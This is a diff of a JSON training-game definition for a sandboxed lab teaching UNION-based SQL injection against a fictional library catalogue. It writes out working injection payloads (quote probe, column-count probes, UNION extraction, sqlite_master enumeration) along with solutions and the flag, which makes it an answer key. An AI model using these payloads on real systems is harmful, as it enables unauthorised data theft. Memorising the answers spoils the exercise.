@@ -1,23 +1,24 @@
 {
-  "title": "SQL Injection — UNION Data Extraction",
-  "description": "Exploit a UNION-based SQL injection in a library catalogue search to pull a hidden flag out of a table the search was never meant to reach.",
+  "title": "SQL Injection — UNION-based Data Extraction",
+  "description": "Exploit a UNION-based SQL injection in the Athenaeum Digital Library catalogue to extract a flag from a hidden database table that the search feature was never designed to reach.",
   "prerequisites": [],
   "outcomes": [
-    "Explain how UNION-based SQL injection differs from authentication-bypass injection.",
-    "Determine the number of columns a query returns using ORDER BY or NULL probing.",
-    "Craft a UNION SELECT payload to extract data from an unrelated database table."
+    "Discover and interact with a vulnerable PHP search endpoint on a web application.",
+    "Identify the result set column count by counting result columns returned in a normal search.",
+    "Confirm SQL injection with a single-quote probe and understand the resulting error message.",
+    "Craft a UNION SELECT payload to pivot from the books table to the librarian_notes table and extract the flag."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
   "variant_sandboxes": false,
-  "estimated_duration": 40,
+  "estimated_duration": 50,
   "levels": [
     {
       "title": "Introduction",
       "level_type": "INFO_LEVEL",
       "order": 0,
       "estimated_duration": 0,
-      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, the **Athenaeum Digital Library**, runs a public book-catalogue search on its website. The developers insist the search is 'read-only, so it can't be dangerous'.\n\nRead-only is not the same as safe. If the search builds its SQL by gluing your input into the query, you can bolt on your own `UNION SELECT` and read data from tables that have nothing to do with books — including a private librarian note that holds the flag."
+      "content": "# General information — please read carefully\n\n* Work through levels in order. Later levels depend on facts discovered in earlier ones.\n* Use hints if you are stuck — each hint costs points but keeps you moving.\n* Only attack the systems inside your sandbox.\n\n# Storyline\n\nYou are a penetration tester engaged by the **Athenaeum Digital Library**, an independent research library that recently digitised its catalogue and put it online. The catalogue exposes a search feature — type an author or title fragment, and the application queries a SQLite database to return matching books.\n\nA junior developer built the search feature in a hurry. The search term is concatenated directly into the SQL query string without parameterisation. This creates a **UNION-based SQL injection** opportunity.\n\nUNION-based SQL injection exploits applications that display results in a structured table. The attacker appends a `UNION SELECT` statement to the original query, causing the database to return rows from a completely different table alongside the legitimate results. To work correctly, the injected SELECT must match the column count and compatible types of the original query — but once those conditions are met, any table in the database is reachable.\n\nThe Athenaeum database contains two tables:\n- `books` — the catalogue, with `title` and `author` columns. This is what the search was designed to query.\n- `librarian_notes` — a private table with a single `note` column. This was never meant to be reachable from the search feature. It contains a flag.\n\nA normal search returns two columns: title and author. Your UNION injection will therefore need to SELECT two columns from `librarian_notes`. Since that table has only one column (`note`), you will use it twice — `SELECT note, note FROM librarian_notes`.\n\nBy the end of this exercise you will understand why column-count matching is the key challenge in UNION injection, how to determine it by inspection, and why parameterised queries make this class of attack completely impossible."
     },
     {
       "title": "Get Access",
@@ -25,107 +26,227 @@
       "order": 1,
       "estimated_duration": 0,
       "passkey": "start",
-      "cloud_content": "SSH to your attacker machine at **10.1.33.23**, then reach the target catalogue:\n\n```\ncurl 'http://10.1.33.10/search.php?q=sea'\n```\n\nThe target server is at **10.1.33.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
-      "local_content": "The target web application is running locally:\n\n```\ncurl 'http://127.0.0.1/search.php?q=sea'\n```\n\nOr open http://127.0.0.1/search.php in a browser. Submit **start** to begin."
+      "cloud_content": "SSH to your attacker machine at **10.1.33.23**, then reach the target catalogue:\n\n```\ncurl http://10.1.33.10/search.php?q=sea\n```\n\nThe target server is at **10.1.33.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "Reach the target catalogue locally:\n\n```\ncurl http://127.0.0.1/search.php?q=sea\n```\n\nOr open http://127.0.0.1/search.php in a browser. Submit **start** to begin."
     },
     {
-      "title": "Confirm the Injection Point",
+      "title": "Discover the Search Endpoint",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
       "estimated_duration": 8,
-      "answer": "'",
+      "answer": "/search.php",
       "answer_variable_name": null,
       "variant_answers": false,
-      "content": "The catalogue search takes a `q` parameter:\n\n```\ncurl 'http://10.1.33.10/search.php?q=sea'\n```\n\nAs with any injection test, the first step is to break the query syntax. Inject a single quote into the search term and watch for a database error:\n\n```\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q='\"\n```\n\nIf the page returns a SQLite error instead of book results, the search is concatenating your input directly into the SQL statement — the query string literal is now unbalanced.\n\n**What single character did you inject to trigger the database error?**",
-      "solution": "```\n$ curl -G 'http://10.1.33.10/search.php' --data-urlencode \"q='\"\n...Database error: unrecognized token: ...'...\n```\n\nThe single quote `'` breaks the `LIKE '%...%'` string literal and produces a syntax error, proving the input is not sanitised. The answer is **'**",
+      "content": "Locate the search feature. Try the most likely PHP endpoint for a catalogue search:\n\n```\ncurl 'http://10.1.33.10/search.php?q=sea'\n```\n\nThe `q` parameter passes the search term. A 200 response containing book titles and authors confirms the endpoint exists and the `q` parameter drives it.\n\nNote the format of the response — the application returns results in a structured list with book titles and author names. Counting the columns returned is the next step.\n\n**What is the URL path of the catalogue search endpoint?** (include the leading slash and .php extension)",
+      "solution": "```\n$ curl 'http://10.1.33.10/search.php?q=sea'\n...Results for: sea...\n<li>The Silent Sea — Marina Holt</li>\n<li>The Last Lighthouse — Eleanor Frost</li>\n...\n```\n\nThe endpoint is **/search.php**.",
       "solution_penalized": false,
       "hints": [
         {
-          "title": "What breaks a SQL string?",
-          "content": "SQL string literals are wrapped in single quotes. Injecting one `'` unbalances the quotes and causes a syntax error if the input is not sanitised.",
-          "hint_penalty": 1,
-          "order": 0
-        },
-        {
-          "title": "How do I send it safely in curl?",
-          "content": "Use `curl -G ... --data-urlencode \"q='\"` so the quote is URL-encoded and reaches PHP intact.",
-          "hint_penalty": 2,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 10,
-      "mitre_techniques": [
-        { "technique_key": "TA0001.T1190" }
-      ]
-    },
-    {
-      "title": "Count the Columns",
-      "level_type": "TRAINING_LEVEL",
-      "order": 3,
-      "estimated_duration": 12,
-      "answer": "2",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "To use `UNION SELECT`, your injected query must return **the same number of columns** as the original query — otherwise the database rejects it.\n\nFind the column count with `ORDER BY`. Increase the number until you get an error:\n\n```\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q=x' ORDER BY 1 -- -\"\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q=x' ORDER BY 2 -- -\"\ncurl -G 'http://10.1.33.10/search.php' --data-urlencode \"q=x' ORDER BY 3 -- -\"\n```\n\n`ORDER BY N` succeeds while column N exists and errors once N is too large. The largest N that does **not** error is the column count.\n\nThe catalogue shows a Title and an Author for each result — a strong hint about how many columns the query selects.\n\n**How many columns does the search query return?**",
-      "solution": "```\n$ curl -G .../search.php --data-urlencode \"q=x' ORDER BY 2 -- -\"   # OK\n$ curl -G .../search.php --data-urlencode \"q=x' ORDER BY 3 -- -\"   # Database error\n```\n\n`ORDER BY 2` works but `ORDER BY 3` errors, so the query returns **2** columns (title and author).",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "What does ORDER BY N do?",
-          "content": "`ORDER BY N` sorts by the Nth column. If column N does not exist, the database throws an error. Increment N until the error appears; the last working value is the column count.",
-          "hint_penalty": 3,
-          "order": 0
-        },
-        {
-          "title": "What does the results table tell you?",
-          "content": "Each result row shows two fields: Title and Author. That maps directly to the number of columns the SELECT returns.",
-          "hint_penalty": 4,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 25,
-      "mitre_techniques": [
-        { "technique_key": "TA0001.T1190" }
-      ]
-    },
-    {
-      "title": "UNION SELECT the Flag",
-      "level_type": "TRAINING_LEVEL",
-      "order": 4,
-      "estimated_duration": 8,
-      "answer": "WMG{un10n_b4s3d_sql1_l34ks_th3_db}",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You know the query returns **2 columns**. Now append a `UNION SELECT` that reads from the private `librarian_notes` table instead of `books`.\n\nThe flag is stored in the `note` column of `librarian_notes`. Your two-column UNION puts the note in the first column (rendered as a book Title) and a filler value in the second:\n\n```\ncurl -G 'http://10.1.33.10/search.php' \\\n  --data-urlencode \"q=' UNION SELECT note, 'x' FROM librarian_notes -- -\"\n```\n\nBreaking the payload down:\n* `'` closes the original `LIKE '%...` string.\n* `UNION SELECT note, 'x' FROM librarian_notes` adds a row from the secret table.\n* `-- -` comments out the trailing `%'` left over from the original query.\n\nThe flag appears in the results table where a book title would normally be.\n\n**Submit the flag pulled from `librarian_notes`.**",
-      "solution": "```\n$ curl -G 'http://10.1.33.10/search.php' \\\n    --data-urlencode \"q=' UNION SELECT note, 'x' FROM librarian_notes -- -\"\n\n...<td>WMG{un10n_b4s3d_sql1_l34ks_th3_db}</td><td>x</td>...\n```\n\nThe UNION injects the secret note into the results as a fake book title.",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "How many columns must UNION SELECT have?",
-          "content": "Exactly two — the same as the original query. Put the secret in one column and any filler (like `'x'`) in the other.",
+          "title": "How to find the search endpoint",
+          "content": "Try: curl 'http://10.1.33.10/search.php?q=sea'. A 200 response with book results confirms the endpoint is /search.php.",
           "hint_penalty": 5,
           "order": 0
         },
         {
-          "title": "Which table and column holds the flag?",
-          "content": "The flag is in the `note` column of the `librarian_notes` table: `UNION SELECT note, 'x' FROM librarian_notes`.",
-          "hint_penalty": 8,
-          "order": 1
-        },
-        {
-          "title": "Why -- - at the end?",
-          "content": "`-- ` starts a SQL comment (the trailing dash keeps it from being trimmed). It discards the leftover `%'` from the original `LIKE` clause so your injected query is syntactically valid.",
+          "title": "The endpoint path",
+          "content": "The search endpoint is /search.php. Include the leading slash and .php extension in your answer.",
           "hint_penalty": 10,
-          "order": 2
+          "order": 1
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
       "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1595" }
+      ]
+    },
+    {
+      "title": "Read the First Search Result",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 7,
+      "answer": "The Silent Sea",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Run a broad search to retrieve the full catalogue:\n\n```\ncurl 'http://10.1.33.10/search.php?q=the'\n```\n\nThe response lists multiple books. Look at the results in order — the first book returned in the list is the one with the lowest database ID.\n\nKnowing the legitimate data helps you verify later that your UNION injection is working: if you see a real book title in the result alongside your injected row, you know the query structure is intact. If your payload displaces all results, something is wrong.\n\n**What is the title of the first book in the search results?** (exact title)",
+      "solution": "```\n$ curl 'http://10.1.33.10/search.php?q=the'\n...Results for: the...\n<li>The Silent Sea — Marina Holt</li>\n<li>The Last Lighthouse — Eleanor Frost</li>\n...\n```\n\nThe first result is **The Silent Sea**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to list the catalogue",
+          "content": "Run: curl 'http://10.1.33.10/search.php?q=the'. The results appear in ascending order by book ID. The first item in the list is the answer.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "The first book title",
+          "content": "The first book returned is: The Silent Sea",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The title is: The Silent Sea",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1592" }
+      ]
+    },
+    {
+      "title": "Probe for SQL Injection",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 8,
+      "answer": "'",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Test whether the search parameter is vulnerable to SQL injection. Inject a single quote to break the query syntax:\n\n```\ncurl 'http://10.1.33.10/search.php?q=%27'\n```\n\n(The `%27` is URL-encoded for a single quote `'`.)\n\nA vulnerable application will respond with a database error containing words like 'SQLite error', 'unrecognized token', or a raw SQL fragment. A safe application would return an empty result set or escape the quote.\n\nThe presence of a raw database error confirms the input is being concatenated directly into the SQL query without sanitisation. This is the precondition for UNION injection.\n\n**What single character did you enter to trigger the SQL error?**",
+      "solution": "```\n$ curl 'http://10.1.33.10/search.php?q=%27'\n...SQLite error: near \"'\"...\n```\n\nThe probe character is **'** (single quote).",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What character breaks SQL strings?",
+          "content": "A single quote ' terminates a SQL string literal. Inserting one without a matching close quote produces a syntax error that the database engine reports as an error message.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to send it",
+          "content": "Use URL encoding: curl 'http://10.1.33.10/search.php?q=%27'. %27 is the URL encoding for a single quote character.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The probe character",
+          "content": "The character is a single quote: '",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Determine the Column Count",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 10,
+      "answer": "2",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "UNION injection requires the injected SELECT to have exactly the same number of columns as the original query. A mismatch causes a 'SELECTs to the left and right of UNION do not have the same number of result columns' error.\n\nYou already know the search returns two pieces of data per result: a title and an author. That means the underlying query selects two columns. Confirm this by trying a UNION with two columns:\n\n```\ncurl \"http://10.1.33.10/search.php?q=sea' UNION SELECT 'col1','col2' --\"\n```\n\nIf the response includes a row containing `col1` and `col2` in the results, your column count is correct. If you get a column mismatch error, try one column or three.\n\n**How many columns does the original search query return?**",
+      "solution": "```\n$ curl \"http://10.1.33.10/search.php?q=sea' UNION SELECT 'col1','col2' --\"\n...Results for: sea...\n<li>The Silent Sea — Marina Holt</li>\n<li>col1 — col2</li>\n...\n```\n\nThe injected row appears successfully — the original query returns **2** columns.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to determine column count",
+          "content": "Attempt a UNION SELECT with increasing column counts. Start with 2: curl \"http://10.1.33.10/search.php?q=sea' UNION SELECT 'a','b' --\". If a row containing 'a' and 'b' appears in the results, the count is 2.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What the search displays",
+          "content": "The search returns a title and an author for each result. That is two pieces of data per row. Therefore the query selects 2 columns.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The column count",
+          "content": "The original query returns 2 columns.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Extract the Flag via UNION",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 10,
+      "answer": "WMG{un10n_b4s3d_sql1_l34ks_th3_db}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You know the original query returns 2 columns. The `librarian_notes` table has one column called `note`. To match the 2-column requirement, select `note` twice:\n\n```\ncurl \"http://10.1.33.10/search.php?q=sea' UNION SELECT note,note FROM librarian_notes --\"\n```\n\nBreaking down the payload:\n- `sea'` — close the legitimate WHERE clause string\n- `UNION SELECT note,note FROM librarian_notes` — pivot to the private table, selecting `note` twice to match the 2-column requirement\n- `--` — comment out the rest of the original query\n\nThe flag in `librarian_notes` will appear as a result row in the search output.\n\n**Submit the flag extracted from the librarian_notes table.**",
+      "solution": "```\n$ curl \"http://10.1.33.10/search.php?q=sea' UNION SELECT note,note FROM librarian_notes --\"\n...Results for: sea...\n<li>The Silent Sea — Marina Holt</li>\n<li>WMG{un10n_b4s3d_sql1_l34ks_th3_db} — WMG{un10n_b4s3d_sql1_l34ks_th3_db}</li>\n...\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Why select note twice?",
+          "content": "The original query returns 2 columns (title, author). librarian_notes only has 1 column (note). UNION requires matching column counts, so you select note twice: UNION SELECT note, note FROM librarian_notes.",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "The full payload",
+          "content": "curl \"http://10.1.33.10/search.php?q=sea' UNION SELECT note,note FROM librarian_notes --\". The flag will appear as a result row in the response.",
+          "hint_penalty": 30,
+          "order": 1
+        },
+        {
+          "title": "Flag format",
+          "content": "The flag starts with WMG{ and ends with }. It appears in the search results as a row injected by your UNION payload.",
+          "hint_penalty": 40,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1005" }
+      ]
+    },
+    {
+      "title": "Name the Hidden Table",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 7,
+      "answer": "librarian_notes",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You successfully extracted data from a table the search feature was never meant to reach. Confirm its name.\n\nIn SQLite, the internal `sqlite_master` table lists all tables and their schemas. You can use a UNION injection to query it:\n\n```\ncurl \"http://10.1.33.10/search.php?q=sea' UNION SELECT name,name FROM sqlite_master WHERE type='table' --\"\n```\n\nThis returns the names of all tables in the database. Look for the table that is not `books` — that is the private table you just exfiltrated data from.\n\n**What is the name of the hidden table from which you extracted the flag?**",
+      "solution": "```\n$ curl \"http://10.1.33.10/search.php?q=sea' UNION SELECT name,name FROM sqlite_master WHERE type='table' --\"\n...Results for: sea...\n<li>The Silent Sea — Marina Holt</li>\n<li>books — books</li>\n<li>librarian_notes — librarian_notes</li>\n...\n```\n\nThe hidden table is **librarian_notes**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to list all tables in SQLite",
+          "content": "In SQLite, sqlite_master contains the list of all tables. Use: UNION SELECT name,name FROM sqlite_master WHERE type='table'. The table you want is the one that is not 'books'.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What the hidden table is called",
+          "content": "The second table in the database (besides books) is the private one from which you extracted the flag.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The table name",
+          "content": "The hidden table is called: librarian_notes",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
       "mitre_techniques": [
         { "technique_key": "TA0009.T1005" }
       ]
@@ -133,10 +254,10 @@
     {
       "title": "Feedback",
       "level_type": "ASSESSMENT_LEVEL",
-      "order": 5,
+      "order": 8,
       "estimated_duration": 5,
       "assessment_type": "QUESTIONNAIRE",
-      "instructions": "Please answer these questions to help us improve the game.",
+      "instructions": "Please answer these questions to help us improve this game.",
       "questions": [
         {
           "question_type": "MCQ",
@@ -153,15 +274,15 @@
         },
         {
           "question_type": "MCQ",
-          "text": "Had you performed a UNION-based SQL injection before this game?",
+          "text": "Before this game, had you performed a UNION-based SQL injection?",
           "points": 0,
           "penalty": 0,
           "order": 1,
           "answer_required": true,
           "choices": [
-            { "text": "Yes, I was comfortable with it", "correct": true, "order": 0 },
-            { "text": "I knew the theory but had not done it", "correct": true, "order": 1 },
-            { "text": "No, this was completely new", "correct": true, "order": 2 }
+            { "text": "Yes, I had done this before",             "correct": true, "order": 0 },
+            { "text": "I knew about SQL injection but not UNION", "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",        "correct": true, "order": 2 }
           ]
         },
         {
@@ -172,10 +293,24 @@
           "order": 2,
           "answer_required": true,
           "choices": [
-            { "text": "Very clear",         "correct": true, "order": 0 },
-            { "text": "Mostly clear",        "correct": true, "order": 1 },
-            { "text": "Confusing at times",  "correct": true, "order": 2 },
-            { "text": "Hard to follow",      "correct": true, "order": 3 }
+            { "text": "Very clear",        "correct": true, "order": 0 },
+            { "text": "Mostly clear",       "correct": true, "order": 1 },
+            { "text": "Confusing at times", "correct": true, "order": 2 },
+            { "text": "Hard to follow",     "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "What is the key requirement for a UNION SELECT injection to work?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            { "text": "The injected SELECT must return the same number of columns as the original", "correct": true, "order": 0 },
+            { "text": "The database must be MySQL (not SQLite)",                                    "correct": true, "order": 1 },
+            { "text": "The attacker must know the table name in advance",                           "correct": true, "order": 2 },
+            { "text": "The application must display results in an HTML table",                      "correct": true, "order": 3 }
           ]
         },
         {
@@ -183,7 +318,7 @@
           "text": "What would you change or add to improve this game?",
           "points": 0,
           "penalty": 0,
-          "order": 3,
+          "order": 4,
           "answer_required": false,
           "choices": []
         }
